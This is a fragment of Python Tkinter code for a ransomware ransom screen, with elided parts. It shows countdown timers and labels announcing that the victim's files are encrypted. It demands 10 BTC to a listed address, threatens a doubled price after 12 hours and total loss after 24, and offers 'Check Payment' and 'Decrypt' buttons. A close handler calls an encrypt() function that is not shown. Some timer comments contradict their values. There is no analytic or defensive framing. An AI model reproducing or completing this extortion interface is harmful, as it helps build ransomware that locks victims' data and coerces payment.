...
TIMER1_START = 24* 3600 + 30 * 60 + 32   # 5:30:32
TIMER2_START = 12 * 3600 + 0  * 60 + 55   # 3:00:55
...
tk.Label(right,text="what does it mean?",font=12,bg=PANEL_BG,fg=DIM,justify="left").pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="All your files have been encrypted ",font=12,bg=PANEL_BG,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="and the key to decrypting them ",font=12,bg=PANEL_BG,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="is paying a sum of 10BTC to the account below",font=12,bg=PANEL_BG,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="Provided you are not able to pay in the next 12hrs",font=12,bg=PANEL_BG,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="the price increases by 2",font=12,bg=PANEL_BG,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="After 24hrs you lose everything ",font=12,bg=RED,fg=DIM).pack(anchor="w", padx=4, pady=(4,0))
tk.Label(right,text="Axjeuwb6thv4647y5g6h8o8j5484 ",font=12,bg=PANEL_BG,fg=DIM).pack()
...
tk.Button(bottom, text="Check Payment", bg=RED,    fg="white",   relief=tk.FLAT,
          padx=10, pady=3,font=12,command=on_delete).pack(side=tk.LEFT, padx=4)
tk.Button(bottom, text="Decrypt",  bg=ACCENT, fg="#0f3460", relief=tk.FLAT,
          padx=10, pady=3,font=12, command=on_login).pack(side=tk.LEFT, padx=4)

# ── Close with countdown ───────────────────────────────
#__the encryption command__
def on_close():
    encrypt()
